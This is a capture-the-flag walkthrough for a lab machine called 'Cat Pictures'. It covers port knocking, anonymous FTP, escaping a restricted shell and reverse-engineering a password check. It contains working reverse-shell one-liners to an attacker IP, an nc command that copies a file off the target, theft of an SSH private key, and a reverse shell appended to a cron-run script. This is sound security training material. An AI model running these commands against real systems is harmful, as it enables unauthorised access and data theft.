# Cat Pictures - Easy

* Add ```catpictures.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v catpictures.thm```:

  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  * 4420/tcp - nvm-express
  * 8080/tcp - http - Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)

* On port 8080, we have a forum for Cat Pictures powered by forum software ```phpBB``` - there is only one post from one topic, and it is posted by 'user'

* The post says the following:

  ```text
  POST ALL YOUR CAT PICTURES HERE :)

  Knock knock! Magic numbers: 1111, 2222, 3333, 4444
  ```

* The 'knock' part here could be referring to port knocking, we can give it a try:

  ```sh
  # install knockd
  # use the above port numbers

  knock catpictures.thm 1111 2222 3333 4444

  # now we can re-scan the machine for any open ports/services
  nmap -T4 -p- -A -Pn -v catpictures.thm
  ```

* Meanwhile, Googling shows us that we can find the phpBB version by navigating to '/styles/prosilver/style.cfg', since the version is not visible in source code; the style config gives us the version as 3.3.3

* After port knocking, if we re-scan the machine, we get open port 21 for FTP; the service on 4420 seems to be related to an internal shell service:

  ```sh
  nc catpictures.thm 4420
  # password required

  # check ftp
  ftp catpictures.thm
  # anonymous login is supported

  ls -la
  # we have a file here

  get note.txt

  exit

  cat note.txt
  ```

* From the note left in FTP, we get to know the password is 'sardinethecat' for the internal shell service - this note is added by user 'catlover'

* We can interact with the internal shell service:

  ```sh
  nc catpictures.thm 4420
  # use above password

  id
  # does not work

  ls
  # this works

  # it seems we are in a limited environment and only some commands are supported

  ls -la /bin
  # shows the commands supported
  # we have bash here

  cd bin
  # this does not work, as mentioned

  # we can continue to enumerate other directories

  ls -la /home
  # we have 'catlover' here

  ls -la /home/catlover
  # there is only one file 'runme'

  /home/catlover/runme
  # this prints a message
  # "THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL"

  # we can try to launch /bin/bash
  /bin/bash
  # after this the service becomes unresponsive
  ```

* As we need a regular shell first in order to access the binary 'runme', we can try one of the reverse-shell one-liners with our ```bash``` program:

  ```sh
  # setup listener on attacker machine
  nc -nvlp 4444

  # in victim shell, we can use a common reverse-shell one-liner
  # changed from sh to /bin/bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.131.57 4444 >/tmp/f

  # this works and we get a reverse shell
  # it is still a limited one

  /home/catlover/runme
  # this asks for a password as well
  # the previous password does not work
  # so we can check this binary further

  # on attacker machine, setup listener for file transfer
  nc -nvlp 4445 > runme

  # in new reverse shell
  nc 10.10.131.57 4445 -w 3 < /home/catlover/runme
  # this transfers 'runme'
  ```

* As we have the 'runme' binary on attacker machine, we can use a tool like 'Ghidra' for basic reverse engineering

* In ```ghidra```, we can view the decompiled ```main``` function:

  ```cpp
  undefined8 main(void)

  {
    __enable_if _Var1;
    basic_ostream *this;
    long in_FS_OFFSET;
    allocator<char> local_69;
    basic_string<char,std--char_traits<char>,std--allocator<char>> local_68 [32];
    basic_string<char,std--char_traits<char>,std--allocator<char>> local_48 [40];
    long local_20;
    
    local_20 = *(long *)(in_FS_OFFSET + 0x28);
    allocator();
    basic_string((char *)local_68,(allocator *)"rebecca");
    ~allocator(&local_69);
    basic_string();
    operator<<<std--char_traits<char>>((basic_ostream *)cout,"Please enter yout password: ");
    operator>><char,std--char_traits<char>,std--allocator<char>>
              ((basic_istream *)cin,(basic_string *)local_48);
    _Var1 = operator==<char>((basic_string *)local_48,(basic_string *)local_68);
    if ((char)_Var1 == '\0') {
      this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"Access Denied");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
      ;
    }
    else {
      this = operator<<<std--char_traits<char>>
                      ((basic_ostream *)cout,"Welcome, catlover! SSH key transfer queued! ");
      operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
      ;
      system("touch /tmp/gibmethesshkey");
    }
    ~basic_string(local_48);
    ~basic_string(local_68);
    if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return 0;
  }
  ```

* Here, we can see the password for this binary is 'rebecca'; and the binary creates a file at '/tmp/gibmethesshkey' - we can try this now:

  ```sh
  # in reverse shell, run the binary again
  /home/catlover/runme
  # use the above password

  # we can check the SSH key now
  cat /tmp/gibmethesshkey
  # this is an empty file

  # check catlover directory again
  ls -la /home/catlover
  # we have a SSH key here

  cat /home/catlover/id_rsa
  # copy the SSH key

  # in attacker machine, paste the key
  vim catlover_id_rsa

  chmod 600 catlover_id_rsa

  ssh catlover@catpictures.thm -i catlover_id_rsa
  # this works

  # we get logged in as root
  id

  # this seems to be a Docker environment

  hostname
  # hostname is random

  ls -la /
  # we have a .dockerenv file here

  cat /proc/1/cgroup
  # includes docker in the paths provided

  ls -la /root
  # we have a flag here
  # but this is flag1, and not the root flag

  # we have a .bash_history file
  cat .bash_history
  # refers to a script

  ls -la /opt/clean/clean.sh
  # we can edit this, as we are root

  cat /opt/clean/clean.sh
  # seems like a script to clean /tmp directory
  # this could be a cronjob

  cat /etc/crontab
  # no such file

  # we can give it a test by modifying the file
  # and adding a reverse-shell one-liner

  # on attacker machine, setup listener
  nc -nvlp 5555

  # in victim ssh
  echo "/bin/bash -i >& /dev/tcp/10.10.131.57/5555 0>&1" >> /opt/clean/clean.sh

  # in a minute, we get reverse-shell on listener
  # we can get root flag now
  ```
